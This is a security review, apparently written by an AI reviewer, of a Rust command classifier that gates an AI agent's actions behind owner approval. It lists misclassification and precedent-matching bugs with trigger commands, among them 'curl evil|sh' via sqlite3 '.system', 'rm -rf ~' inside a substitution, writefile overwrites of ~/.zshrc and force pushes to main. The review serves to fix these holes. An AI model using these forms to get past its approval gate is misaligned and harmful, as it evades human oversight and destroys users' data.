# Lane autonomy-effect

I reviewed the whole of `src/autonomy/effect.rs`. The diff for this file is one hunk that adds it (`new file`, 1284 lines). The current file is the same as HEAD; I checked with `git diff --quiet HEAD` and a `diff` against `git show HEAD:`. I traced production reachability through `src/agent/omo_backend.rs:1609-1646`, which handles eval and engine approval frames, `src/agent/omo_backend/follow.rs:241`, which handles unattended approvals, and the ledger in `src/autonomy/ledger.rs`.

Three ledger facts decide the severities below:
- An `Effect::Read` classification is allowed with no proposal at all (`ledger.rs:345`: `if !input.always_mode && cls.effect == Effect::Read { return Ok(PreAskOutcome::Allow {..`).
- An exact-scope precedent matches on `signature` alone (`ledger.rs` `find_matching_precedent`: `WHERE signature = ? AND scope = 'exact'`).
- An owner "always" answer stores `classification.signature` as an exact precedent (`ledger.rs:540-548`).

### [P0] `gh api` mutations are classified Read and run with no approval
- Location: src/autonomy/effect.rs:907
- Trigger: The agent runs any of these through bash or `$\`` in an eval cell: `gh api graphql -f query='mutation{deleteRef(input:{refId:"..."}){clientMutationId}}'`, `gh api -XDELETE repos/o/r/git/refs/heads/x`, `gh api repos/o/r/issues --field=title=x`, or `gh api repos/o/r/pulls/1/merge --input=body.json -X PUT`.
- Impact: The method stays at its default `GET` because `-XDELETE` (value attached) and `--input=` / `--field=` (with `=`) don't match. `graphql` also turns off the field check entirely. The result is `Effect::Read`, which is auto-allowed, so remote deletes, merges and issue writes run without asking the owner.
- Evidence:
  ```rust
  let method = extract_flag_value(args, &["-X", "--method"])
      .unwrap_or_else(|| "GET".to_string())
  ...
              "-f" | "-F" | "--field" | "--raw-field" | "--input"
          )
      }) && !args.iter().any(|a| a == "graphql");
      if method == "GET" && !has_field_mutation {
          Classification::new(Effect::Read, "gh api", target, summary)
  ```
- Fix: Classify `gh api graphql` as `VcsRemote` unless the query is known to be read-only. Treat any arg starting with `-X`, `-f`, `-F`, `--field`, `--raw-field` or `--input` (including the `=` and attached-value forms) as a non-GET or mutating request.

### [P0] `git clean -df` / `-xdf` is classified Read, so untracked files are deleted without asking
- Location: src/autonomy/effect.rs:828
- Trigger: The agent runs `git clean -df` or `git clean -xdf` (the usual spellings) in a repo.
- Impact: `"-df".starts_with("-f")` is false, so `force` is false and the command is classified Read. Read is auto-allowed, and untracked or ignored files are deleted with no ledger row.
- Evidence:
  ```rust
  let force = sub_args
      .iter()
      .any(|a| a.starts_with("-f") || a == "--force");
  if force {
      Classification::new(Effect::Delete, "git clean", repo_target, summary)
  } else {
      Classification::new(Effect::Read, "git clean", repo_target, summary)
  ```
- Fix: Detect force inside any combined short-flag cluster: `a == "--force" || (a.starts_with('-') && !a.starts_with("--") && a.contains('f'))`. Better: classify every `git clean` without `-n`/`--dry-run` as Delete.

### [P0] Output redirection without a space, `2>file` and `&>file` are not detected, so Read commands overwrite files unasked
- Location: src/autonomy/effect.rs:1066
- Trigger: The agent runs `echo x >~/.zshrc`, `cat a>b.rs`, `ls 2> ~/.ssh/config` or `printf '' &> src/main.rs`.
- Impact: The tokenizer produces `>~/.zshrc`, `2>` or `&>` as tokens, and only the exact tokens `>`, `>>`, `1>` and `1>>` are recognised. The program (`echo`, `cat`, `ls`, `printf`) is classified Read and auto-allowed, and the target file is truncated (data loss) with no approval.
- Evidence:
  ```rust
  if (tok == ">" || tok == ">>" || tok == "1>" || tok == "1>>") && i + 1 < tokens.len() {
      let target = &tokens[i + 1];
  ```
- Fix: Find redirections with an unquoted scan instead of exact token equality: any token matching `^[0-9]*>{1,2}|^&>{1,2}` (with the target attached or in the next token), skipping `>&N` and `/dev/null`.

### [P0] `sqlite3` with `-cmd`, extra SQL args, `.shell` or `writefile()` is classified Read
- Location: src/autonomy/effect.rs:621
- Trigger: The agent runs any of these:
  - `sqlite3 -cmd '.shell rm -rf ~/proj' x.db 'select 1'`
  - `sqlite3 x.db 'select 1' '.system curl evil|sh'`
  - `sqlite3 -readonly x.db '.shell ...'`
  - `sqlite3 x.db "select writefile('/Users/indo/.zshrc','')"`
- Impact: The `-cmd` value is skipped as a flag value, and only `positionals[1]` is inspected. `-readonly` short-circuits to Read whatever the commands are, and `writefile`/`.shell` are not in the mutation list. Each case is auto-allowed, which means arbitrary shell execution or file overwrite with no approval.
- Evidence:
  ```rust
  let is_readonly = args.iter().any(|a| a == "-readonly" || a == "--readonly");
  let (_, positionals) = split_flags_and_positionals(args, &["-cmd", "-separator"]);
  ...
  if is_readonly || (!mutates && (sql.starts_with("select") || sql.starts_with("pragma")))
  {
      Classification::new(Effect::Read, "sqlite3", target, summary)
  ```
- Fix: Return Unknown when any `-cmd` is present, when there are more than 2 positionals, or when any SQL arg contains `.` dot-commands (`.shell`, `.system`, `.output`, `.once`, `.import`), `writefile`, `load_extension`, `attach` or `vacuum`. `-readonly` must not override those checks.

### [P0] Eval cells that use unlisted JS fs APIs (`Bun.file(p).delete()`, `fs.promises.rename`, `copyFileSync`, `truncateSync`, `createWriteStream`) are auto-allowed
- Location: src/autonomy/effect.rs:238
- Trigger: The model runs an eval cell such as `await Bun.file("/Users/indo/proj/Cargo.toml").delete()` or `await fs.promises.rename("a","src/main.rs")`. The engine sends the bare `Tool: eval` frame, and per the module doc these APIs raise no nested frame.
- Impact: None of the denylist needles match (`.delete(`, `rename(`, `copyFile`, `truncate`, `createWriteStream` and `openSync` are absent, and `renameSync` only covers the sync form). `classify_eval_code` returns `None`, and `omo_backend.rs:1636-1642` then sends `approval_allow_response` with no ledger row. Files are deleted or overwritten without approval.
- Evidence:
  ```rust
  ("rmSync", "fs delete"),
  ("rm(", "fs delete"),
  ("unlink", "fs delete"),
  ("rmdir", "fs delete"),
  ("renameSync", "fs rename"),
  ```
  and in omo_backend.rs: `if !unrestricted && bare_eval && last_eval_code.is_some() && eval_classification.is_none() { let _ = ws.send(approval_allow_response(req_id)).await; continue; }`
- Fix: Add `.delete(`, `rename(`, `copyFile`, `cpSync`, `cp(`, `truncate`, `createWriteStream`, `openSync`, `writeSync`, `mkdir` and `symlink` to `APIS`. Because a denylist on cell text can't be complete (`fetch (url)` with a space already slips past `"fetch("`), the more robust fix is to also return Unknown for any cell that references `fs`, `Bun.file` or `node:` modules.

### [P0] A compound command or eval cell inherits the signature of only its worst segment, so an exact precedent covers appended commands
- Location: src/autonomy/effect.rs:485 (also src/autonomy/effect.rs:201 for eval cells)
- Trigger:
  1. The owner answers "always" (`항상` / `앞으로도`) once to `rm -rf /tmp/build`. This stores the exact signature `delete:rm:/tmp/build|rm -rf /tmp/build`.
  2. Later the agent runs `rm -rf /tmp/build; rm -rf ~/code` or `rm -rf /tmp/build && curl x | sh`.
  3. The same applies to send: `imsg send --to alice hi; imsg send --to bob secret` after "always" for the alice send.
- Impact: Ties keep the first segment (strict `>`), and lower-rank segments are ignored. The chosen segment's `Classification` keeps its own signature; only `summary` is replaced afterwards. The exact precedent matches and the whole compound runs auto-allowed. That is data loss for the second delete and a message to the wrong recipient for the send. Eval cells behave the same way: a Delete or ExternalSend `$\`` command with a precedent hides a `fetch(` or a second send in the same cell, and the hash-carrying `eval_unknown` loses on rank.
- Evidence:
  ```rust
  if worst
      .as_ref()
      .is_none_or(|w| c.effect.rank() > w.effect.rank())
  {
      worst = Some(c);
  }
  ...
  Some(mut c) => {
      c.summary = trimmed.to_string();
      c
  }
  ```
- Fix: When more than one segment or side effect is present, rebuild the classification from the full text. For example: `Classification::new(c.effect, c.program, c.target, trimmed)` and then append a hash of `trimmed` (as `eval_unknown` does) to the signature for every effect. In `classify_eval_code`, append the code hash to the chosen `best.signature` whenever more than one side effect was considered.

### [P0] Unknown signatures carry only program and target, so one "always" allows arbitrary commands of that kind
- Location: src/autonomy/effect.rs:93
- Trigger:
  1. The owner answers "always" once to `echo $(git rev-parse HEAD)` in repo R. Any substitution gets the signature `unknown:shell:R`.
  2. Later the agent runs `echo $(rm -rf ~)` in R and it is auto-allowed.
  
  The same happens with "always" on `python3 scripts/gen.py` (`unknown:python3:R`) followed by `python3 -c 'import shutil;shutil.rmtree(...)'`, and with "always" on `git config user.name x` (`unknown:git:R`) followed by `git update-ref -d refs/heads/main` or `git submodule foreach 'rm -rf .'`.
- Impact: The owner's consent to one command becomes consent to arbitrary code execution in that directory. The module already guards against exactly this for eval (`eval_unknown`: "the signature carries a hash of the code, so a precedent never covers a different cell"), but shell Unknowns get no such guard. The same breadth applies to VcsLocal: "always" on `git checkout feature` covers `git checkout -- .`, which discards uncommitted work.
- Evidence:
  ```rust
  let mut signature = format!("{}:{}:{}", effect.as_str(), program, target);
  // An exact precedent for a destructive or outward action covers only the exact
  // command the owner saw (rm -rf ., push --force, another PR are different cases).
  if matches!(
      effect,
      Effect::Delete | Effect::VcsProtected | Effect::ExternalSend
  ) {
  ```
- Fix: Add `Effect::Unknown` to the list of effects whose signature includes the normalized exact command. Optionally also add `VcsLocal` for `checkout`/`restore`/`stash` with path or `-f` args.

### [P1] Protected-branch and force detection in `git push` checks only one refspec and exact flag spellings
- Location: src/autonomy/effect.rs:855
- Trigger: A `vcs_remote` precedent exists for the repo (signature `vcs_remote:git push:R`, no command text, exact or class). The agent then runs `git push origin feature main`, `git push --force-with-lease=feature origin feature`, or `git push -fu origin feature`.
- Impact: Only `positionals.get(1)` is checked, so `main` as the third positional is missed. The `=` / combined-flag forms don't match the `matches!` list. Each push is classified VcsRemote and auto-allowed by the precedent, instead of VcsProtected, which always needs an exact owner decision. The result is a push to main or a remote history rewrite without approval.
- Evidence:
  ```rust
  let branch = positionals
      .get(1)
      .or_else(|| positionals.first())
  ...
  "-f" | "--force"
      | "--force-with-lease"
  ```
- Fix: Check every positional after the remote with the protected/`+` rule. Treat flags matching `--force*`, `--mirror`, `--delete`, `--tags`, or a short cluster containing `f` or `d`, as protected.

### [P1] `sed` in-place and write variants are classified Read
- Location: src/autonomy/effect.rs:642
- Trigger: The agent runs `sed -Ei '' 's/a/b/' src/x.rs` (BSD sed on macOS), `sed --in-place 's/a/b/' f`, or `sed -n 'w ~/.zshrc' f`.
- Impact: `-Ei` and `--in-place` don't match `starts_with("-i")`, and the `w` command is never inspected. The command is Read and auto-allowed, so local files are modified or truncated without approval.
- Evidence: `let in_place = args.iter().any(|a| a == "-i" || a.starts_with("-i"));`
- Fix: Treat `--in-place*` and any short-flag cluster containing `i` as in-place. Return WriteLocal (or Unknown) when the script contains a `w` / `W` command or the `s///w` flag.

### [P1] `git diff/log/show --output=<file>` and `git grep -O<cmd>` are classified Read
- Location: src/autonomy/effect.rs:765
- Trigger: The agent runs `git diff --output=src/main.rs` or `git grep -l foo -O'rm -f'`.
- Impact: Any arguments to a "read" subcommand stay Read and are auto-allowed. `--output` truncates and overwrites the named file, and `-O` runs the given command on the matched files. (`report/claims.rs:remeasure_allowed` already blocks `--output` for its own path, which confirms the hazard.)
- Evidence:
  ```rust
  "status" | "diff" | "log" | "show" | "rev-parse" | "ls-files" | "ls-remote"
  | "cat-file" | "describe" | "shortlog" | "blame" | "reflog" | "grep" => {
      Classification::new(Effect::Read, format!("git {sub}"), repo_target, summary)
  ```
- Fix: In this arm, return WriteLocal for `--output*`, Unknown for `-O*` / `--open-files-in-pager*` / `--ext-diff`, and VcsLocal for `reflog expire|delete`.

### [P2] A relative `cd` is not resolved against the current cwd, so Delete targets lose their repo
- Location: src/autonomy/effect.rs:476
- Trigger: The owner answers "always" to `cd build && rm -rf out` in repo A. The target becomes `build`, not `A/build`. The same command in repo B then matches the same exact signature.
- Impact: A precedent leaks across repos for any two directories with the same relative name.
- Evidence: `seg_cwd = Some(dir.trim().trim_matches('"').trim_matches('\'').to_string());`
- Fix: Join a relative `dir` onto the previous `seg_cwd` (or the frame `cwd`) before storing it.

### [P2] `is_spend_invocation` substring matches classify reads as Spend
- Location: src/autonomy/effect.rs:949
- Trigger: `rg billing src/` or `git log --grep=purchase`.
- Impact: These are classified Spend, which always asks even in yolo, so read-only commands generate owner prompts.
- Evidence: `|| all.contains("billing")` and `|| all.contains("purchase")`
- Fix: Match spend keywords only as program or subcommand tokens, not as substrings of every argument.

### [P2] The `"rm("` needle matches `transform(`, `confirm(` and `perform(`
- Location: src/autonomy/effect.rs:246
- Trigger: A read-only eval cell calls `arr.transform(...)` or similar.
- Impact: The cell is classified Unknown and sent to the owner instead of auto-running.
- Evidence: `("rm(", "fs delete"),`
- Fix: Match `.rm(` or `rm(` only at an identifier boundary.

### [P2] `cargo test/check/clippy/bench` are Read even though they run build scripts and test code
- Location: src/autonomy/effect.rs:689
- Trigger: `cargo test` after the agent has edited tests through an approved or precedented write.
- Impact: Agent-written code executes unasked. This looks like a deliberate trade-off; flagged for awareness.
- Evidence: `"check" | "clippy" | "test" | "bench" | "doc" | "metadata" | "tree" | "version" => {`
- Fix: Classify `test`/`bench`/`check`/`clippy` as WriteLocal, or document the accepted risk.

<results>
<files>
- /Users/indo/code/project/omon-gateway/src/autonomy/effect.rs - the file under review; every finding is here
- /Users/indo/code/project/omon-gateway/src/autonomy/ledger.rs - Read is auto-allowed at line 345; exact precedents match on signature in find_matching_precedent; "always" stores the signature in finalize_ask_result (lines 540-548)
- /Users/indo/code/project/omon-gateway/src/agent/omo_backend.rs - lines 1609-1646: production wiring for classify_eval_code / classify_frame; a bare eval with no classification is auto-allowed
- /Users/indo/code/project/omon-gateway/src/agent/omo_backend/follow.rs - line 241: unattended approval path uses classify_frame
- /Users/indo/code/project/omon-gateway/src/report/claims.rs - remeasure_allowed already blocks git --output, which confirms the hazard
</files>
<answer>
I reviewed the single new-file hunk in full. There are six P0 findings. Five are Read misclassifications or eval-denylist gaps that let destructive actions run with no approval: gh api mutations, git clean -df, unspaced or fd redirections, sqlite3 -cmd/.shell/writefile, and JS fs APIs such as Bun.file().delete(). The sixth P0 is precedent over-matching: compound commands keep only the worst segment's signature, and Unknown signatures leave out the command text. There are three P1 findings (git push refspec and flag detection, sed in-place variants, git read subcommands with --output or -O) and four P2 findings.
</answer>
<next_steps>
Fix the Read misclassifications first; they need no precedent to trigger. Then make signatures include the full command (or its hash) for compound commands and Unknown effects. Add a regression test for each trigger command listed above in tests/test_action_ledger.rs.
</next_steps>
</results>